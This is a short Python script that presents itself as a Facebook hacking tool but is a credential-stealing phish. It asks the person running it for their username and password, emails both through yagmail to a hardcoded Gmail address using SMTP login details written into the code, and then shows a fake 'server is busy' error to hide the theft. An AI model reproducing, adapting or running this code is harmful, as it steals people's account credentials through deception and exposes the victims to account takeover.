import yagmail
from termcolor import colored
import os

baner="""
 _                _    _
| |__   __ _  ___| | _(_)_ __   __ _
| '_ \ / _` |/ __| |/ / | '_ \ / _` |
| | | | (_| | (__|   <| | | | | (_| |
|_| |_|\__,_|\___|_|\_\_|_| |_|\__, |
[!]Hacking FACEBOOK fake[!]    |___/
                                 """
print(colored(baner,'magenta'))
print(os.linesep)

print(colored('You should login for get id target','blue'))
username=str(input(colored('Username: ','yellow')))
password=str(input(colored('Password: ','yellow')))

subject='account target'
body=('username: '+username,'password: '+password)
x=yagmail.SMTP('cacacrackphiss@gmail.com','jeager1999$')
x.send('cacacrack000@gmail.com',subject,body)

print(colored('Error','red'))
print(colored('Sorry, server is busy','red'))